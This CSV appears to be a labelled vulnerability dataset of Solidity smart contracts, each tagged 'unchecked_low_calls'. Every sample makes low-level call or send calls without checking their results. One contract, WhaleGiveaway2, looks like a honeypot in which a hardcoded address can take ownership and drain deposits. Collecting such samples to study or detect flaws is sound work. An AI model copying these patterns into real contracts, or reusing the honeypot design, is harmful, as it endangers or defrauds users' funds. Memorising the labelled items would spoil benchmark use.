filename,vulnerability_category,source_code
0xe894d54dca59cb53fe9cbc5155093605c7068220.sol,unchecked_low_calls,"pragma solidity ^0.4.24; contract airDrop{ function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){ require(_tos.length > 0); bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)"")); uint _value = v * 10 ** _decimals; for(uint i=0;i<_tos.length;i++){ caddress.call(id,from,_tos[i],_value); } return true; } }"
0xec329ffc97d75fe03428ae155fc7793431487f63.sol,unchecked_low_calls,"pragma solidity ^0.4.11; contract Owned { function Owned() { owner = msg.sender; } address public owner; modifier onlyOwner { if (msg.sender == owner) _; } function changeOwner(address _newOwner) onlyOwner { owner = _newOwner; } function execute(address _dst, uint _value, bytes _data) onlyOwner { _dst.call.value(_value)(_data); } } contract Token { function transfer(address, uint) returns(bool); function balanceOf(address) constant returns (uint); } contract TokenSender is Owned { Token public token; uint public totalToDistribute; uint public next; struct Transfer { address addr; uint amount; } Transfer[] public transfers; function TokenSender(address _token) { token = Token(_token); } uint constant D160 = 0x0010000000000000000000000000000000000000000; function fill(uint[] data) onlyOwner { if (next>0) throw; uint acc; uint offset = transfers.length; transfers.length = transfers.length + data.length; for (uint i = 0; i < data.length; i++ ) { address addr = address( data[i] & (D160-1) ); uint amount = data[i] / D160; transfers[offset + i].addr = addr; transfers[offset + i].amount = amount; acc += amount; } totalToDistribute += acc; } function run() onlyOwner { if (transfers.length == 0) return; uint mNext = next; next = transfers.length; if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw; while ((mNext<transfers.length) && ( gas() > 150000 )) { uint amount = transfers[mNext].amount; address addr = transfers[mNext].addr; if (amount > 0) { if (!token.transfer(addr, transfers[mNext].amount)) throw; } mNext ++; } next = mNext; } function hasTerminated() constant returns (bool) { if (transfers.length == 0) return false; if (next < transfers.length) return false; return true; } function nTransfers() constant returns (uint) { return transfers.length; } function gas() internal constant returns (uint _gas) { assembly { _gas:= gas } } }"
0xf2570186500a46986f3139f65afedc2afe4f445d.sol,unchecked_low_calls,"pragma solidity ^0.4.16; contract RealOldFuckMaker { address fuck = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D; function makeOldFucks(uint32 number) { uint32 i; for (i = 0; i < number; i++) { fuck.call(bytes4(sha3(""giveBlockReward()""))); } } }"
0xf29ebe930a539a60279ace72c707cba851a57707.sol,unchecked_low_calls,pragma solidity ^0.4.24; contract B { address public owner = msg.sender; function go() public payable { address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C; target.call.value(msg.value)(); owner.transfer(address(this).balance); } function() public payable { } }
0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol,unchecked_low_calls,"pragma solidity ^0.4.19; contract WhaleGiveaway2 { address public Owner = msg.sender; function() public payable { } function GetFreebie() public payable { if(msg.value>1 ether) { Owner.transfer(this.balance); msg.sender.transfer(this.balance); } } function withdraw() payable public { if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;} require(msg.sender == Owner); Owner.transfer(this.balance); } function Command(address adr,bytes data) payable public { require(msg.sender == Owner); adr.call.value(msg.value)(data); } }"
etherpot_lotto.sol,unchecked_low_calls,"pragma solidity ^0.4.0; contract Lotto { uint constant public blocksPerRound = 6800; uint constant public ticketPrice = 100000000000000000; uint constant public blockReward = 5000000000000000000; function getBlocksPerRound() constant returns(uint){ return blocksPerRound; } function getTicketPrice() constant returns(uint){ return ticketPrice; } struct Round { address[] buyers; uint pot; uint ticketsCount; mapping(uint=>bool) isCashed; mapping(address=>uint) ticketsCountByBuyer; } mapping(uint => Round) rounds; function getRoundIndex() constant returns (uint){ return block.number/blocksPerRound; } function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){ return rounds[roundIndex].isCashed[subpotIndex]; } function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){ var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex); if(decisionBlockNumber>block.number) return; var decisionBlockHash = getHashOfBlock(decisionBlockNumber); var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount; var ticketIndex = uint256(0); for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){ var buyer = rounds[roundIndex].buyers[buyerIndex]; ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer]; if(ticketIndex>winningTicketIndex){ return buyer; } } } function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){ return ((roundIndex+1)*blocksPerRound)+subpotIndex; } function getSubpotsCount(uint roundIndex) constant returns(uint){ var subpotsCount = rounds[roundIndex].pot/blockReward; if(rounds[roundIndex].pot%blockReward>0) subpotsCount++; return subpotsCount; } function getSubpot(uint roundIndex) constant returns(uint){ return rounds[roundIndex].pot/getSubpotsCount(roundIndex); } function cash(uint roundIndex, uint subpotIndex){ var subpotsCount = getSubpotsCount(roundIndex); if(subpotIndex>=subpotsCount) return; var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex); if(decisionBlockNumber>block.number) return; if(rounds[roundIndex].isCashed[subpotIndex]) return; var winner = calculateWinner(roundIndex,subpotIndex); var subpot = getSubpot(roundIndex); winner.send(subpot); rounds[roundIndex].isCashed[subpotIndex] = true; } function getHashOfBlock(uint blockIndex) constant returns(uint){ return uint(block.blockhash(blockIndex)); } function getBuyers(uint roundIndex,address buyer) constant returns (address[]){ return rounds[roundIndex].buyers; } function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){ return rounds[roundIndex].ticketsCountByBuyer[buyer]; } function getPot(uint roundIndex) constant returns(uint){ return rounds[roundIndex].pot; } function() { var roundIndex = getRoundIndex(); var value = msg.value-(msg.value%ticketPrice); if(value==0) return; if(value<msg.value){ msg.sender.send(msg.value-value); } var ticketsCount = value/ticketPrice; rounds[roundIndex].ticketsCount+=ticketsCount; if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){ var buyersLength = rounds[roundIndex].buyers.length++; rounds[roundIndex].buyers[buyersLength] = msg.sender; } rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount; rounds[roundIndex].ticketsCount+=ticketsCount; rounds[roundIndex].pot+=value; } }"
king_of_the_ether_throne.sol,unchecked_low_calls,"pragma solidity ^0.4.0; contract KingOfTheEtherThrone { struct Monarch { address etherAddress; string name; uint claimPrice; uint coronationTimestamp; } address wizardAddress; modifier onlywizard { if (msg.sender == wizardAddress) _; } uint constant startingClaimPrice = 100 finney; uint constant claimPriceAdjustNum = 3; uint constant claimPriceAdjustDen = 2; uint constant wizardCommissionFractionNum = 1; uint constant wizardCommissionFractionDen = 100; uint public currentClaimPrice; Monarch public currentMonarch; Monarch[] public pastMonarchs; function KingOfTheEtherThrone() { wizardAddress = msg.sender; currentClaimPrice = startingClaimPrice; currentMonarch = Monarch( wizardAddress, ""[Vacant]"", 0, block.timestamp ); } function numberOfMonarchs() constant returns (uint n) { return pastMonarchs.length; } event ThroneClaimed( address usurperEtherAddress, string usurperName, uint newClaimPrice ); function() { claimThrone(string(msg.data)); } function claimThrone(string name) { uint valuePaid = msg.value; if (valuePaid < currentClaimPrice) { msg.sender.send(valuePaid); return; } if (valuePaid > currentClaimPrice) { uint excessPaid = valuePaid - currentClaimPrice; msg.sender.send(excessPaid); valuePaid = valuePaid - excessPaid; } uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen; uint compensation = valuePaid - wizardCommission; if (currentMonarch.etherAddress != wizardAddress) { currentMonarch.etherAddress.send(compensation); } else { } pastMonarchs.push(currentMonarch); currentMonarch = Monarch( msg.sender, name, valuePaid, block.timestamp ); uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen; if (rawNewClaimPrice < 10 finney) { currentClaimPrice = rawNewClaimPrice; } else if (rawNewClaimPrice < 100 finney) { currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo); } else if (rawNewClaimPrice < 1 ether) { currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney); } else if (rawNewClaimPrice < 10 ether) { currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney); } else if (rawNewClaimPrice < 100 ether) { currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney); } else if (rawNewClaimPrice < 1000 ether) { currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether); } else if (rawNewClaimPrice < 10000 ether) { currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether); } else { currentClaimPrice = rawNewClaimPrice; } ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice); } function sweepCommission(uint amount) onlywizard { wizardAddress.send(amount); } function transferOwnership(address newOwner) onlywizard { wizardAddress = newOwner; } }"
lotto.sol,unchecked_low_calls,pragma solidity ^0.4.18; contract Lotto { bool public payedOut = false; address public winner; uint public winAmount; function sendToWinner() public { require(!payedOut); winner.send(winAmount); payedOut = true; } function withdrawLeftOver() public { require(payedOut); msg.sender.send(this.balance); } }
mishandled.sol,unchecked_low_calls,pragma solidity ^0.4.0; contract SendBack { mapping (address => uint) userBalances; function withdrawBalance() { uint amountToWithdraw = userBalances[msg.sender]; userBalances[msg.sender] = 0; msg.sender.send(amountToWithdraw); } }
unchecked_return_value.sol,unchecked_low_calls,pragma solidity 0.4.25; contract ReturnValue { function callchecked(address callee) public { require(callee.call()); } function callnotchecked(address callee) public { callee.call(); } }
